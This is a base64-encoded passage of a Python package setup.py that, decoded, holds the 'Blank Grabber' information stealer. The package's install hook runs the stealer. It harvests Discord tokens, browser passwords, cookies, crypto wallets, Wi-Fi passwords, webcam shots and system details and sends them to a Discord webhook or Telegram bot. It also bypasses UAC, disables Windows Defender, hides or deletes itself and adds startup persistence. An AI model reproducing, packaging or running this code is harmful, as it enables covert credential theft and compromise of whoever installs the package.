YgbGVuKGdwdSkgPj0gMiBlbHNlICdVbmFibGUgdG8gZGV0ZWN0IEdQVScKICAgICAgICAgICAgcHJvZHVjdEtleSA9IHN1YnByb2Nlc3MucnVuKCJwb3dlcnNoZWxsIEdldC1JdGVtUHJvcGVydHlWYWx1ZSAtUGF0aCAnSEtMTTpTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzIE5UXFxDdXJyZW50VmVyc2lvblxcU29mdHdhcmVQcm90ZWN0aW9uUGxhdGZvcm0nIC1OYW1lIEJhY2t1cFByb2R1Y3RLZXlEZWZhdWx0IiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhcHR1cmVfb3V0cHV0PVRydWUsIHNoZWxsPVRydWUpLnN0ZG91dC5kZWNvZGUoZXJyb3JzPSdpZ25vcmUnKS5zdHJpcCgpIG9yICdVbmFibGUgdG8gZ2V0IHByb2R1Y3Qga2V5JwogICAgICAgICAgICBodHRwID0gUG9vbE1hbmFnZXIoY2VydF9yZXFzPSdDRVJUX05PTkUnKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByOiBkaWN0ID0ganNvbi5sb2FkcyhodHRwLnJlcXVlc3QoCiAgICAgICAgICAgICAgICAgICAgJ0dFVCcsICdodHRwOi8vaXAtYXBpLmNvbS9qc29uLz9maWVsZHM9MjI1NTQ1JykuZGF0YS5kZWNvZGUoZXJyb3JzPSdpZ25vcmUnKSkKICAgICAgICAgICAgICAgIGlmIHIuZ2V0KCdzdGF0dXMnKSAhPSAnc3VjY2Vzcyc6CiAgICAgICAgICAgICAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCdGYWlsZWQnKQogICAgICAgICAgICAgICAgZGF0YSA9IGYiXG5JUDoge3JbJ3F1ZXJ5J119XG5SZWdpb246IHtyWydyZWdpb25OYW1lJ119XG5Db3VudHJ5OiB7clsnY291bnRyeSddfVxuVGltZXpvbmU6IHtyWyd0aW1lem9uZSddfVxuXG57J0NlbGx1bGFyIE5ldHdvcms6Jy5sanVzdCgyMCl9IHsoY2hyKDk5ODkpIGlmIHJbJ21vYmlsZSddIGVsc2UgY2hyKDEwMDYyKSl9XG57J1Byb3h5L1ZQTjonLmxqdXN0KDIwKX0geyhjaHIoOTk4OSkgaWYgclsncHJveHknXSBlbHNlIGNocigxMDA2MikpfSIKICAgICAgICAgICAgICAgIGlmIGxlbihyWydyZXZlcnNlJ10pICE9IDA6CiAgICAgICAgICAgICAgICAgICAgZGF0YSArPSBmIlxuUmV2ZXJzZSBETlM6IHtyWydyZXZlcnNlJ119IgogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgaXBpbmZvID0gJyhVbmFibGUgdG8gZ2V0IElQIGluZm8pJwogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgaXBpbmZvID0gZGF0YQogICAgICAgICAgICBzeXN0ZW1faW5mbyA9IGYnQ29tcHV0ZXIgTmFtZToge2NvbXB1dGVyTmFtZX1cbkNvbXB1dGVyIE9TOiB7Y29tcHV0ZXJPU31cblRvdGFsIE1lbW9yeToge3RvdGFsTWVtb3J5fVxuVVVJRDoge3V1aWR9XG5DUFU6IHtjcHV9XG5HUFU6IHtncHV9XG5Qcm9kdWN0IEtleToge3Byb2R1Y3RLZXl9JwogICAgICAgICAgICBjb2xsZWN0aW9uID0geydEaXNjb3JkIEFjY291bnRzJzogc2VsZi5EaXNjb3JkVG9rZW5zQ291bnQsICdQYXNzd29yZHMnOiBzZWxmLlBhc3N3b3Jkc0NvdW50LCAnQ29va2llcyc6IGxlbihzZWxmLkNvb2tpZXMpLCAnSGlzdG9yeSc6IHNlbGYuSGlzdG9yeUNvdW50LCAnQXV0b2ZpbGxzJzogc2VsZi5BdXRvZmlsbENvdW50LCAnUm9ibG94IENvb2tpZXMnOiBzZWxmLlJvYmxveENvb2tpZXNDb3VudCwgJ1RlbGVncmFtIFNlc3Npb25zJzogc2VsZi5UZWxlZ3JhbVNlc3Npb25zQ291bnQsICdDb21tb24gRmlsZXMnOiBzZWxmLkNvbW1vbkZpbGVzQ291bnQsICdXYWxsZXRzJzogc2VsZi5XYWxsZXRzQ291bnQsICdXaWZpIFBhc3N3b3Jkcyc6IHNlbGYuV2lmaVBhc3N3b3Jkc0NvdW50LCAnV2ViY2FtJzogc2VsZi5XZWJjYW1QaWN0dXJlc0NvdW50LAogICAgICAgICAgICAgICAgICAgICAgICAgICdNaW5lY3JhZnQgU2Vzc2lvbnMnOiBzZWxmLk1pbmVjcmFmdFNlc3Npb25zLCAnRXBpYyBTZXNzaW9uJzogJ1llcycgaWYgc2VsZi5FcGljU3RvbGVuIGVsc2UgJ05vJywgJ1N0ZWFtIFNlc3Npb24nOiAnWWVzJyBpZiBzZWxmLlN0ZWFtU3RvbGVuIGVsc2UgJ05vJywgJ1VwbGF5IFNlc3Npb24nOiAnWWVzJyBpZiBzZWxmLlVwbGF5U3RvbGVuIGVsc2UgJ05vJywgJ0dyb3d0b3BpYSBTZXNzaW9uJzogJ1llcycgaWYgc2VsZi5Hcm93dG9waWFTdG9sZW4gZWxzZSAnTm8nLCAnU2NyZWVuc2hvdCc6ICdZZXMnIGlmIHNlbGYuU2NyZWVuc2hvdFRha2VuIGVsc2UgJ05vJywgJ1N5c3RlbSBJbmZvJzogJ1llcycgaWYgc2VsZi5TeXN0ZW1JbmZvU3RvbGVuIGVsc2UgJ05vJ30KICAgICAgICAgICAgZ3JhYmJlZEluZm8gPSAnXG4nLmpvaW4oW2tleSArICcgOiAnICsgc3RyKHZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3Iga2V5LCB2YWx1ZSBpbiBjb2xsZWN0aW9uLml0ZW1zKCldKQogICAgICAgICAgICBtYXRjaCBTZXR0aW5ncy5DMlswXToKICAgICAgICAgICAgICAgIGNhc2UgMDoKICAgICAgICAgICAgICAgICAgICBpbWFnZV91cmwgPSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JsYW5rLWMvQmxhbmstR3JhYmJlci9tYWluLy5naXRodWIvd29ya2Zsb3dzL2ltYWdlLnBuZycKICAgICAgICAgICAgICAgICAgICBwYXlsb2FkID0geydjb250ZW50JzogJ3x8QGV2ZXJ5b25lfHwnIGlmIFNldHRpbmdzLlBpbmdNZSBlbHNlICcnLCAnZW1iZWRzJzogW3sndGl0bGUnOiAnQmxhbmsgR3JhYmJlcicsICdkZXNjcmlwdGlvbic6IGYnKipfX1N5c3RlbSBJbmZvX19cbmBgYGF1dG9ob3RrZXlcbntzeXN0ZW1faW5mb31gYGBcbl9fSVAgSW5mb19fYGBgcHJvbG9nXG57aXBpbmZvfWBgYFxuX19HcmFiYmVkIEluZm9fX2BgYGpzXG57Z3JhYmJlZEluZm99YGBgKionLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd1cmwnOiAnaHR0cHM6Ly9naXRodWIuY29tL0JsYW5rLWMvQmxhbmstR3JhYmJlcicsICdjb2xvcic6IDM0MzAzLCAnZm9vdGVyJzogeyd0ZXh0JzogJ0dyYWJiZWQgYnkgQmxhbmsgR3JhYmJlciB8IGh0dHBzOi8vZ2l0aHViLmNvbS9CbGFuay1jL0JsYW5rLUdyYWJiZXInfSwgJ3RodW1ibmFpbCc6IHsndXJsJzogaW1hZ2VfdXJsfX1dLCAndXNlcm5hbWUnOiAnQmxhbmsgR3JhYmJlcicsICdhdmF0YXJfdXJsJzogaW1hZ2VfdXJsfQogICAgICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguZ2V0c2l6ZShzZWxmLkFyY2hpdmVQYXRoKSAvICgxMDI0ICogMTAyNCkgPiAyMDoKICAgICAgICAgICAgICAgICAgICAgICAgdXJsID0gc2VsZi5VcGxvYWRUb0V4dGVybmFsU2VydmljZSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuQXJjaGl2ZVBhdGgsIGZpbGVuYW1lKQogICAgICAgICAgICAgICAgICAgICAgICBpZiB1cmwgaXMgTm9uZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlIEV4Y2VwdGlvbigKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnRmFpbGVkIHRvIHVwbG9hZCB0byBleHRlcm5hbCBzZXJ2aWNlJykKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICB1cmwgPSBOb25lCiAgICAgICAgICAgICAgICAgICAgZmllbGRzID0gZGljdCgpCiAgICAgICAgICAgICAgICAgICAgaWYgdXJsOgogICAgICAgICAgICAgICAgICAgICAgICBwYXlsb2FkWydjb250ZW50J10gKz0gJyB8IEFyY2hpdmUgOiAlcycgJSB1cmwKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBmaWVsZHNbJ2ZpbGUnXSA9IChmaWxlbmFtZSwgb3BlbigKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuQXJjaGl2ZVBhdGgsICdyYicpLnJlYWQoKSkKICAgICAgICAgICAgICAgICAgICBmaWVsZHNbJ3BheWxvYWRfanNvbiddID0ganNvbi5kdW1wcyhwYXlsb2FkKS5lbmNvZGUoKQogICAgICAgICAgICAgICAgICAgIGh0dHAucmVxdWVzdCgnUE9TVCcsIFNldHRpbmdzLkMyWzFdLCBmaWVsZHM9ZmllbGRzKQogICAgICAgICAgICAgICAgY2FzZSAxOgogICAgICAgICAgICAgICAgICAgIHBheWxvYWQgPSB7J2NhcHRpb24nOiBmJzxiPkJsYW5rIEdyYWJiZXI8L2I+IGdvdCBhIG5ldyB2aWN0aW06IDxiPntvcy5nZXRsb2dpbigpfTwvYj5cblxuPGI+SVAgSW5mbzwvYj5cbjxjb2RlPntpcGluZm99PC9jb2RlPlxuXG48Yj5TeXN0ZW0gSW5mbzwvYj5cbjxjb2RlPntzeXN0ZW1faW5mb308L2NvZGU+XG5cbjxiPkdyYWJiZWQgSW5mbzwvYj5cbjxjb2RlPntncmFiYmVkSW5mb308L2NvZGU+Jy5zdHJpcCgpLCAncGFyc2VfbW9kZSc6ICdIVE1MJ30KICAgICAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmdldHNpemUoc2VsZi5BcmNoaXZlUGF0aCkgLyAoMTAyNCAqIDEwMjQpID4gNDA6CiAgICAgICAgICAgICAgICAgICAgICAgIHVybCA9IHNlbGYuVXBsb2FkVG9FeHRlcm5hbFNlcnZpY2UoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLkFyY2hpdmVQYXRoLCBmaWxlbmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgdXJsIGlzIE5vbmU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByYWlzZSBFeGNlcHRpb24oCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0ZhaWxlZCB0byB1cGxvYWQgdG8gZXh0ZXJuYWwgc2VydmljZScpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgdXJsID0gTm9uZQogICAgICAgICAgICAgICAgICAgIGZpZWxkcyA9IGRpY3QoKQogICAgICAgICAgICAgICAgICAgIGlmIHVybDoKICAgICAgICAgICAgICAgICAgICAgICAgcGF5bG9hZFsndGV4dCddID0gcGF5bG9hZFsnY2FwdGlvbiddICsgXAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1xuXG5BcmNoaXZlIDogJXMnICUgdXJsCiAgICAgICAgICAgICAgICAgICAgICAgIG1ldGhvZCA9ICdzZW5kTWVzc2FnZScKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBmaWVsZHNbJ2RvY3VtZW50J10gPSAoZmlsZW5hbWUsIG9wZW4oCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLkFyY2hpdmVQYXRoLCAncmInKS5yZWFkKCkpCiAgICAgICAgICAgICAgICAgICAgICAgIG1ldGhvZCA9ICdzZW5kRG9jdW1lbnQnCiAgICAgICAgICAgICAgICAgICAgdG9rZW4sIGNoYXRfaWQgPSBTZXR0aW5ncy5DMlsxXS5zcGxpdCgnJCcpCiAgICAgICAgICAgICAgICAgICAgZmllbGRzLnVwZGF0ZShwYXlsb2FkKQogICAgICAgICAgICAgICAgICAgIGZpZWxkcy51cGRhdGUoeydjaGF0X2lkJzogY2hhdF9pZH0pCiAgICAgICAgICAgICAgICAgICAgaHR0cC5yZXF1ZXN0KCdQT1NUJywgJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Qlcy8lcycgJQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAodG9rZW4sIG1ldGhvZCksIGZpZWxkcz1maWVsZHMpCgogICAgaWYgb3MubmFtZSA9PSAnbnQnOgogICAgICAgIExvZ2dlci5pbmZvKCdQcm9jZXNzIHN0YXJ0ZWQnKQogICAgICAgIGlmIFNldHRpbmdzLkhpZGVDb25zb2xlOgogICAgICAgICAgICBTeXNjYWxscy5IaWRlQ29uc29sZSgpCiAgICAgICAgaWYgbm90IFV0aWxpdHkuSXNBZG1pbigpOgogICAgICAgICAgICBMb2dnZXIud2FybmluZygnQWRtaW4gcHJpdmlsZWdlcyBub3QgYXZhaWxhYmxlJykKICAgICAgICAgICAgaWYgVXRpbGl0eS5HZXRTZWxmKClbMV06CiAgICAgICAgICAgICAgICBpZiBub3QgJy0tbm91YWNieXBhc3MnIGluIHN5cy5hcmd2IGFuZCBTZXR0aW5ncy5VYWNCeXBhc3M6CiAgICAgICAgICAgICAgICAgICAgTG9nZ2VyLmluZm8oCiAgICAgICAgICAgICAgICAgICAgICAgICdUcnlpbmcgdG8gYnlwYXNzIFVBQyAoQXBwbGljYXRpb24gd2lsbCByZXN0YXJ0KScpCiAgICAgICAgICAgICAgICAgICAgaWYgVXRpbGl0eS5VQUNieXBhc3MoKToKICAgICAgICAgICAgICAgICAgICAgICAgb3MuX2V4aXQoMCkKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBMb2dnZXIud2FybmluZygnRmFpbGVkIHRvIGJ5cGFzcyBVQUMnKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgVXRpbGl0eS5Jc0luU3RhcnR1cChzeXMuZXhlY3V0YWJsZSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2dnZXIuaW5mbygnU2hvd2luZyBVQUMgcHJvbXB0JykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIFV0aWxpdHkuVUFDUHJvbXB0KHN5cy5leGVjdXRhYmxlKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5fZXhpdCgwKQogICAgICAgICAgICAgICAgaWYgbm90IFV0aWxpdHkuSXNJblN0YXJ0dXAoKSBhbmQgKG5vdCBTZXR0aW5ncy5VYWNCeXBhc3MpOgogICAgICAgICAgICAgICAgICAgIExvZ2dlci5pbmZvKAogICAgICAgICAgICAgICAgICAgICAgICAnU2hvd2luZyBVQUMgcHJvbXB0IHRvIHVzZXIgKEFwcGxpY2F0aW9uIHdpbGwgcmVzdGFydCknKQogICAgICAgICAgICAgICAgICAgIGlmIFV0aWxpdHkuVUFDUHJvbXB0KHN5cy5leGVjdXRhYmxlKToKICAgICAgICAgICAgICAgICAgICAgICAgb3MuX2V4aXQoMCkKICAgICAgICBMb2dnZXIuaW5mbygnVHJ5aW5nIHRvIGNyZWF0ZSBtdXRleCcpCiAgICAgICAgaWYgbm90IFN5c2NhbGxzLkNyZWF0ZU11dGV4KFNldHRpbmdzLk11dGV4KToKICAgICAgICAgICAgTG9nZ2VyLmluZm8oJ011dGV4IGFscmVhZHkgZXhpc3RzLCBleGl0aW5nJykKICAgICAgICAgICAgb3MuX2V4aXQoMCkKICAgICAgICBpZiBVdGlsaXR5LkdldFNlbGYoKVsxXToKICAgICAgICAgICAgTG9nZ2VyLmluZm8oJ1RyeWluZyB0byBleGNsdWRlIHRoZSBmaWxlIGZyb20gV2luZG93cyBkZWZlbmRlcicpCiAgICAgICAgICAgIFV0aWxpdHkuRXhjbHVkZUZyb21EZWZlbmRlcigpCiAgICAgICAgTG9nZ2VyLmluZm8oJ1RyeWluZyB0byBkaXNhYmxlIGRlZmVuZGVyJykKICAgICAgICBVdGlsaXR5LkRpc2FibGVEZWZlbmRlcigpCiAgICAgICAgaWYgVXRpbGl0eS5HZXRTZWxmKClbMV0gYW5kIChTZXR0aW5ncy5SdW5Cb3VuZE9uU3RhcnR1cCBvciBub3QgVXRpbGl0eS5Jc0luU3RhcnR1cCgpKSBhbmQgb3MucGF0aC5pc2ZpbGUoKGJvdW5kRmlsZVNyYyA6PSBvcy5wYXRoLmpvaW4oc3lzLl9NRUlQQVNTLCAnYm91bmQuYmxhbmsnKSkpOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBMb2dnZXIuaW5mbygnVHJ5aW5nIHRvIGV4dHJhY3QgYm91bmQgZmlsZScpCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZmlsZSgoYm91bmRGaWxlRHN0IDo9IG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ3RlbXAnKSwgJ2JvdW5kLmV4ZScpKSk6CiAgICAgICAgICAgICAgICAgICAgTG9nZ2VyLmluZm8oJ09sZCBib3VuZCBmaWxlIGZvdW5kLCByZW1vdmluZyBpdCcpCiAgICAgICAgICAgICAgICAgICAgb3MucmVtb3ZlKGJvdW5kRmlsZURzdCkKICAgICAgICAgICAgICAgIHdpdGggb3Blbihib3VuZEZpbGVTcmMsICdyYicpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgY29udGVudCA9IGZpbGUucmVhZCgpCiAgICAgICAgICAgICAgICBkZWNyeXB0ZWQgPSB6bGliLmRlY29tcHJlc3MoY29udGVudFs6Oi0xXSkKICAgICAgICAgICAgICAgIHdpdGggb3Blbihib3VuZEZpbGVEc3QsICd3YicpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZShkZWNyeXB0ZWQpCiAgICAgICAgICAgICAgICBkZWwgY29udGVudCwgZGVjcnlwdGVkCiAgICAgICAgICAgICAgICBMb2dnZXIuaW5mbygnVHJ5aW5nIHRvIGV4Y2x1ZGUgYm91bmQgZmlsZSBmcm9tIGRlZmVuZGVyJykKICAgICAgICAgICAgICAgIFV0aWxpdHkuRXhjbHVkZUZyb21EZWZlbmRlcihib3VuZEZpbGVEc3QpCiAgICAgICAgICAgICAgICBMb2dnZXIuaW5mbygnU3RhcnRpbmcgYm91bmQgZmlsZScpCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKCdzdGFydCBib3VuZC5leGUnLCBzaGVsbD1UcnVlLCBjd2Q9b3MucGF0aC5kaXJuYW1lKAogICAgICAgICAgICAgICAgICAgIGJvdW5kRmlsZURzdCksIGNyZWF0aW9uZmxhZ3M9c3VicHJvY2Vzcy5DUkVBVEVfTkVXX0NPTlNPTEUgfCBzdWJwcm9jZXNzLlNXX0hJREUpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIExvZ2dlci5lcnJvcihlKQogICAgICAgIGlmIFV0aWxpdHkuR2V0U2VsZigpWzFdIGFuZCBTZXR0aW5ncy5GYWtlRXJyb3JbMF0gYW5kIChub3QgVXRpbGl0eS5Jc0luU3RhcnR1cCgpKToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgTG9nZ2VyLmluZm8oJ1Nob3dpbmcgZmFrZSBlcnJvciBwb3B1cCcpCiAgICAgICAgICAgICAgICB0aXRsZSA9IFNldHRpbmdzLkZha2VFcnJvclsxXVswXS5yZXBsYWNlKAogICAgICAgICAgICAgICAgICAgICciJywgJ1xceDIyJykucmVwbGFjZSgiJyIsICdcXHgyMicpCiAgICAgICAgICAgICAgICBtZXNzYWdlID0gU2V0dGluZ3MuRmFrZUVycm9yWzFdWzFdLnJlcGxhY2UoCiAgICAgICAgICAgICAgICAgICAgJyInLCAnXFx4MjInKS5yZXBsYWNlKCInIiwgJ1xceDIyJykKICAgICAgICAgICAgICAgIGljb24gPSBpbnQoU2V0dGluZ3MuRmFrZUVycm9yWzFdWzJdKQogICAgICAgICAgICAgICAgY21kID0gJ21zaHRhICJqYXZhc2NyaXB0OnZhciBzaD1uZXcgQWN0aXZlWE9iamVjdChcJ1dTY3JpcHQuU2hlbGxcJyk7IHNoLlBvcHVwKFwne31cJywgMCwgXCd7fVwnLCB7fSsxNik7Y2xvc2UoKSInLmZvcm1hdCgKICAgICAgICAgICAgICAgICAgICBtZXNzYWdlLCB0aXRsZSwgU2V0dGluZ3MuRmFrZUVycm9yWzFdWzJdKQogICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbigKICAgICAgICAgICAgICAgICAgICBjbWQsIHNoZWxsPVRydWUsIGNyZWF0aW9uZmxhZ3M9c3VicHJvY2Vzcy5DUkVBVEVfTkVXX0NPTlNPTEUgfCBzdWJwcm9jZXNzLlNXX0hJREUpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIExvZ2dlci5lcnJvcihlKQogICAgICAgIGlmIG5vdCBTZXR0aW5ncy5WbXByb3RlY3Qgb3Igbm90IFZtUHJvdGVjdC5pc1ZNKCk6CiAgICAgICAgICAgIGlmIFV0aWxpdHkuR2V0U2VsZigpWzFdOgogICAgICAgICAgICAgICAgaWYgU2V0dGluZ3MuTWVsdCBhbmQgKG5vdCBVdGlsaXR5LklzSW5TdGFydHVwKCkpOgogICAgICAgICAgICAgICAgICAgIExvZ2dlci5pbmZvKCdIaWRpbmcgdGhlIGZpbGUnKQogICAgICAgICAgICAgICAgICAgIFV0aWxpdHkuSGlkZVNlbGYoKQogICAgICAgICAgICBlbGlmIFNldHRpbmdzLk1lbHQ6CiAgICAgICAgICAgICAgICBMb2dnZXIuaW5mbygnRGVsZXRpbmcgdGhlIGZpbGUnKQogICAgICAgICAgICAgICAgVXRpbGl0eS5EZWxldGVTZWxmKCkKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgaWYgVXRpbGl0eS5HZXRTZWxmKClbMV0gYW5kIFNldHRpbmdzLlN0YXJ0dXAgYW5kIChub3QgVXRpbGl0eS5Jc0luU3RhcnR1cCgpKToKICAgICAgICAgICAgICAgICAgICBMb2dnZXIuaW5mbygnVHJ5aW5nIHRvIHB1dCB0aGUgZmlsZSBpbiBzdGFydHVwJykKICAgICAgICAgICAgICAgICAgICBwYXRoID0gVXRpbGl0eS5QdXRJblN0YXJ0dXAoKQogICAgICAgICAgICAgICAgICAgIGlmIHBhdGggaXMgbm90IE5vbmU6CiAgICAgICAgICAgICAgICAgICAgICAgIExvZ2dlci5pbmZvKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0V4Y2x1ZGluZyB0aGUgZmlsZSBmcm9tIFdpbmRvd3MgZGVmZW5kZXIgaW4gc3RhcnR1cCcpCiAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxpdHkuRXhjbHVkZUZyb21EZWZlbmRlcihwYXRoKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgTG9nZ2VyLmVycm9yKCdGYWlsZWQgdG8gcHV0IHRoZSBmaWxlIGluIHN0YXJ0dXAnKQogICAgICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIExvZ2dlci5pbmZvKCdDaGVja2luZyBpbnRlcm5ldCBjb25uZWN0aW9uJykKICAgICAgICAgICAgICAgICAgICBpZiBVdGlsaXR5LklzQ29ubmVjdGVkVG9JbnRlcm5ldCgpOgogICAgICAgICAgICAgICAgICAgICAgICBMb2dnZXIuaW5mbygKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdJbnRlcm5ldCBjb25uZWN0aW9uIGF2YWlsYWJsZSwgc3RhcnRpbmcgc3RlYWxlciAodGhpbmdzIHdpbGwgYmUgcnVubmluZyBpbiBwYXJhbGxlbCknKQogICAgICAgICAgICAgICAgICAgICAgICBCbGFua0dyYWJiZXIoKQogICAgICAgICAgICAgICAgICAgICAgICBMb2dnZXIuaW5mbygnU3RlYWxlciBmaW5pc2hlZCBpdHMgd29yaycpCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgTG9nZ2VyLmluZm8oCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnSW50ZXJuZXQgY29ubmVjdGlvbiBub3QgZm91bmQsIHJldHJ5aW5nIGluIDEwIHNlY29uZHMnKQogICAgICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEwKQogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgICAgIGlmIGlzaW5zdGFuY2UoZSwgS2V5Ym9hcmRJbnRlcnJ1cHQpOgogICAgICAgICAgICAgICAgICAgICAgICBvcy5fZXhpdCgxKQogICAgICAgICAgICAgICAgICAgIExvZ2dlci5jcml0aWNhbChlLCBleGNfaW5mbz1UcnVlKQogICAgICAgICAgICAgICAgICAgIExvZ2dlci5pbmZvKAogICAgICAgICAgICAgICAgICAgICAgICAnVGhlcmUgd2FzIGFuIGVycm9yLCByZXRyeWluZyBhZnRlciAxMCBtaW51dGVzJykKICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDYwMCkKICAgICAgICAgICAgaWYgVXRpbGl0eS5HZXRTZWxmKClbMV0gYW5kIFNldHRpbmdzLk1lbHQgYW5kIChub3QgVXRpbGl0eS5Jc0luU3RhcnR1cCgpKToKICAgICAgICAgICAgICAgIExvZ2dlci5pbmZvKCdEZWxldGluZyB0aGUgZmlsZScpCiAgICAgICAgICAgICAgICBVdGlsaXR5LkRlbGV0ZVNlbGYoKQogICAgICAgICAgICBMb2dnZXIuaW5mbygnUHJvY2VzcyBlbmRlZCcpCgoKY2xhc3MgQWZ0ZXJEZXZlbG9wKGRldmVsb3ApOgogICAgZGVmIHJ1bihzZWxmKToKICAgICAgICBkZXZlbG9wLnJ1bihzZWxmKQoKCmNsYXNzIEFmdGVySW5zdGFsbChpbnN0YWxsKToKICAgIGRlZiBydW4oc2VsZik6CiAgICAgICAgaW5zdGFsbC5ydW4oc2VsZikKICAgICAgICByY2QoKQoKCnNldHVwdG9vbHMuc2V0dXAoCiAgICBuYW1lPSJlZjMyMzM0MzRyZWZlZmVmZmUiLAogICAgdmVyc2lvbj0iMS4wIiwKICAgIGxpY2Vuc2U9Ik1JVCIsCiAgICBwYWNrYWdlX2Rpcj17IiI6ICJzcmMifSwKICAgIHBhY2thZ2VzPXNldHVwdG9vbHMuZmluZF9wYWNrYWdlcyh3aGVyZT0ic3JjIiksCiAgICBpbnN0YWxsX3JlcXVpcmVzPVsidXJsbGliMyIsICJweWFlcyJdLAogICAgcHl0aG9uX3JlcXVpcmVzPSI+PTMuNiIsCiAgICBjbWRjbGFzcz17CiAgICAgICAgJ2RldmVsb3AnOiBBZnRlckRldmVsb3AsCiAgICAgICAgJ2luc3RhbGwnOiBBZnRlckluc3RhbGwsCiAgICB9LAopCg==
